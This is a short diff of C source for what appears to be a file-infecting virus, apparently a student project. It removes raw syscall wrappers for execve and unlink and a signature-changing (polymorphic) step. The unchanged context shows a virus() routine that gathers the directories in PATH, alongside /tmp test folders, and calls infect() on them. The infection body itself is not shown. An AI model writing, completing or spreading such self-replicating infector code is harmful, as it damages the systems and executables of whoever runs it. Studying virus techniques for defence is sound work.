@@ -56,7 +56,6 @@ type name(type1 arg1,type2 arg2, type3 arg3, type4 arg4)\
 
 
 __syscall3(size_t, read, int, fd, void *, buf, size_t, count);
-__syscall3(int, execve, const char *, filename,  char const**, argv,  char const**,  envp);
 
 __syscall2(int, munmap, void *, addr, size_t, length);
 __syscall2(int, fstat, int, fildes, struct stat * , buf);
@@ -64,10 +63,7 @@ __syscall3(int, open, const char *, pathname, int, flags, mode_t, mode);
 __syscall3(int, getdents64, int, fd, void *, dirp,  uint, count);
 __syscall3(ssize_t, write, int, fd, const void *, buf, size_t, count);
 __syscall2(int, rename, const char *, old, const char *, new);
-
-
 __syscall1(int, close, int, fd);
-__syscall1(int, unlink, const char  *, pathname);
 
 int magic = 0;
 char env[1024];
@@ -451,13 +447,11 @@ int infect(char path[],size_t path_length)
 //UN BUFFER POUR LE READ
 int virus(void)
 {
-	if (magic == 1)
-		change_signature();
+
 	printf("virus\n");
 	char path[256];
 	ft_memmove(path,"/tmp/test:/tmp/test2:",21);
 	printf("content: %s\n",path);
-
 	get_env_var("PATH=",path + 21,256 - 21);
 	infect(path, 256);
 	printf("content: %s\n",path);
